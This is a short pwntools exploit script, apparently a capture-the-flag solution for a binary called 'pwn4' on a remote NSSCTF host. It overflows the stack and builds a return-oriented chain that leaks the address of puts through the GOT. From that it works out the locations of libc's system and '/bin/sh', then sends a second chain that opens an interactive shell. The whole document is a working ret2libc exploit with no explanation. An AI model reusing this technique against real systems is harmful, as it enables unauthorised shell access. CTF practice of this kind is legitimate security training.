from pwn import *
context.log_level = 'debug'
p = process('./pwn4')
p = remote('node4.anna.nssctf.cn',28956)
elf = ELF('./pwn4')
libc = ELF('./libc-2.31.so')

ret_addr = 0x0000000000400556
pop_rdi_ret_addr = 0x00000000004007d3
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
puts_offset = libc.symbols['puts']
main_addr = elf.symbols['main']

padding = 0x67
payload = b'\x00' + cyclic(padding)
payload += p64(pop_rdi_ret_addr) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendline(payload)
puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print(hex(puts_addr))

#base = puts_addr - libc.sym['puts']
#log.success(b'base-->',hex(base))
system_addr = puts_addr - puts_offset + libc.symbols['system']
binsh_addr = puts_addr -puts_offset + next(libc.search(b'/bin/sh'))

#system_addr = base + libc.sym['system']
#binsh_addr = base + next(libc.search(b'/bin/sh'))
#log.success('system-->',hex(system_addr))
#log.success('binsh_addr-->',hex(binsh_addr))

padding = 0x67
payload = b'\x00' + cyclic(padding) 
payload += p64(ret_addr) + p64(pop_rdi_ret_addr) + p64(binsh_addr) + p64(system_addr)
p.sendline(payload)
p.recv()



p.interactive()
